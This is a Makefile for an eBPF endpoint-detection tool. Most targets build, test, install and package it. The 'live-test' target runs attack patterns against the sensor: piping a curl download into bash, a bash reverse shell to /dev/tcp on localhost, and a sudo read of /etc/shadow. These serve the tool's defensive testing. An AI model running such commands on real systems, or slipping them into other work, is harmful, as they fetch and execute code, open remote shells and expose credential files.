# Sentinel Lineage EDR — Makefile

VERSION := $(shell cat VERSION 2>/dev/null || echo 0.0.0)
PKG_NAME := sentinel-lineage-edr-$(VERSION)

BPF_SRC := ebpf/sentinel_lineage.bpf.c
BPF_OBJ := build/sentinel_lineage.o
CLANG := clang
BPF_CFLAGS := -target bpf -D__TARGET_ARCH_x86 -I/usr/include -I/usr/include/bpf -Wall -O2 -g

.PHONY: all build verify test run-hub run-agent simulate live-test demo install-deps setup-kernel package clean help

all: build test

## build — compile the eBPF program (needs clang + kernel headers)
build: $(BPF_OBJ)
$(BPF_OBJ): $(BPF_SRC)
	@mkdir -p build
	@echo "[*] Compiling eBPF program…"
	$(CLANG) $(BPF_CFLAGS) -c $(BPF_SRC) -o $@
	@echo "[✓] Built $@"

## verify — syntax-check the eBPF source without a full build
verify:
	$(CLANG) $(BPF_CFLAGS) -fsyntax-only $(BPF_SRC)
	@echo "[✓] eBPF syntax OK"

## test — run the Python test suite
test:
	python3 tests/test_lineage.py

## run-hub — run the collector + dashboard in the foreground
run-hub:
	python3 collector/sentinel_hub_lineage.py

## run-agent — run the eBPF agent (root, real kernel required)
run-agent:
	sudo python3 agent/sentinel_lineage_agent.py

## simulate — ship synthetic threat events to a running hub
simulate:
	python3 tools/simulate_attacks.py 200

## live-test — trigger real attack patterns against the live agent
live-test:
	@echo "[*] Running live attack simulation..."
	@echo "  Test 1: Benign process"
	/bin/ls -la /
	@echo "  Test 2: Pipe execute pattern"
	timeout 2 bash -c 'curl -s http://httpbin.org/get | bash' 2>/dev/null || true
	@echo "  Test 3: Reverse shell pattern"
	timeout 2 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' 2>/dev/null || true
	@echo "  Test 4: Shadow access (needs sudo)"
	sudo timeout 2 cat /etc/shadow 2>/dev/null || true
	@echo "[✓] Live test complete"

## install-deps — distro packages for building/running everything
install-deps:
	@set -e; \
	if command -v apt-get >/dev/null; then \
	  sudo apt-get install -y python3 python3-venv python3-pip clang llvm libbpf-dev \
	    linux-headers-$$(uname -r) bpfcc-tools python3-bcc; \
	elif command -v dnf >/dev/null; then \
	  sudo dnf install -y python3 python3-pip clang llvm bcc-tools python3-bcc kernel-headers kernel-devel; \
	elif command -v pacman >/dev/null; then \
	  sudo pacman -Sy --needed python python-pip clang llvm bcc python-bcc linux-headers; \
	else echo "Unsupported distro — install clang, llvm, bcc, kernel headers manually."; fi

## setup-kernel — load BPF infrastructure
setup-kernel:
	sudo modprobe bpf
	sudo mount -t debugfs none /sys/kernel/debug 2>/dev/null || true
	sudo mount -t tracefs none /sys/kernel/tracing 2>/dev/null || true
	@echo "[✓] Kernel ready"

## package — release tarball in dist/
package:
	@mkdir -p dist
	tar czf dist/$(PKG_NAME).tar.gz \
	  --exclude='.venv' --exclude='build' --exclude='dist' --exclude='__pycache__' \
	  --exclude='*.pyc' --exclude='lineage_db.json' --exclude='sentinel.db' --exclude='*.db' --exclude='.git' \
	  --exclude='.env' \
	  --transform 's,^\.,$(PKG_NAME),' .
	@echo "[✓] dist/$(PKG_NAME).tar.gz"

## demo — run the live attack demo (localhost-only, on the sensor box)
demo:
	sudo ./demo/attack.sh

## clean — remove build artifacts
clean:
	rm -rf build dist
	@echo "[✓] Cleaned"

## help — list targets
help:
	@grep -E '^## ' $(MAKEFILE_LIST) | sed 's/## /  /'
